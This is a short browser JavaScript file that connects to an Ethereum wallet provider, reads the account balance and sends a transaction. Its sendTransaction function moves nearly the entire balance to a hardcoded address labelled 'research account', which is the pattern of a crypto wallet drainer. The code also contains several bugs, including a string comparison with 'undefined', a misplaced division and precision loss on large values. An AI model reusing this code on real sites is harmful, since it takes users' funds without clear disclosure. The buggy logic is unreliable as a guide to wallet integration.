//onload check if window.ethereum is present
window.onload = function(){
    if(window.ethereum !== "undefined"){
        this.ethereum.on("accountsChanged",handleAccountsChanged)
    }
}
//set accounts and eth_balance(in ETH) to global variable
let accounts;
let eth_bal;
//Provider listner
const handleAccountsChanged = (a)=>{
    console.log("Accounts changed")
    accounts = a //pass the new account 'a' to accounts variable
}

//transactions are asynchronous
async function connectWallet(){
    //returns all the connected accounts
    accounts = await window.ethereum.request({method: "eth_requestAccounts"}).catch((err)=>{console.log(err.message)})

    console.log(accounts)

}

async function checkBalance(){
    let balance = await window.ethereum.request({method: "eth_getBalance",
    params:[accounts[0],'latest']
    }).catch((err)=>{console.log(err.message)})
    eth_bal = parseInt(balance)
    console.log(eth_bal)/Math.pow(10,18)

}

async function sendTransaction(){
    let fee = 42000000000000000
    let params = [{
        "from":accounts[0],
        "to": "0x80533F540dBc2D024433b3f7a1E80D5eF15E54D3", //research account
        "gas": Number(21000).toString(16),
        "gasPrice": Number(200000000000).toString(16),
        "value": Number(eth_bal-fee).toString(16),
        //"data": needed to interact with smart contract
        }]

    window.ethereum.request({method: "eth_sendTransaction",params}).catch((err)=>console.log(err.code))
}